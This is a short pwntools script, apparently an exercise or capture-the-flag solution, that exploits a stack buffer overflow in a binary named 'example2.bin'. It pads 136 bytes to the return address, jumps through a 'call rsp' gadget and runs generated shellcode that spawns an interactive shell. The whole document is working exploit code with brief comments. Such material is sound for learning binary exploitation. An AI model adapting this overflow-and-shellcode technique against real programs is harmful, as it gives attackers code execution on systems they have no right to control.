from pwn import *

#Using the pattern create feature, found that the offset to the return address was 136
OFFSET = 136

#After disassembling our binary file, searched for different different ways to trampoline to code I control and found a 'ff d4'
CALLRSP = 0x401259

#create a remote process
p = process("example2.bin")

#shellcode
context.arch = "amd64"
SC = asm(shellcraft.amd64.linux.sh())

p.sendline(b"A"*OFFSET + p64(CALLRSP) + SC)

p.interactive()
